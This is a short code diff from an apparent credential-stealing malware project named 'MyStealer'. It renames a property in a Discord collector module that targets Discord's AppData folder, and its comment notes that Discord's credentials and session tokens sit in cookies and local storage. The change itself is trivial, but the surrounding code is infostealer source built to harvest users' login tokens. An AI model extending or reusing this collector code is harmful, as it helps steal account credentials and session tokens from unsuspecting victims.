@@ -7,7 +7,7 @@ namespace MyStealer.Collector.Browser.ChromiumBased
     // but it uses CEF as backend, and all credentials and session tokens are stored in cookies & local storage
     public class Discord : Chromium
     {
-        public override string ModuleName => "Discord";
+        public override string Name => "Discord";
 
         protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord");
 
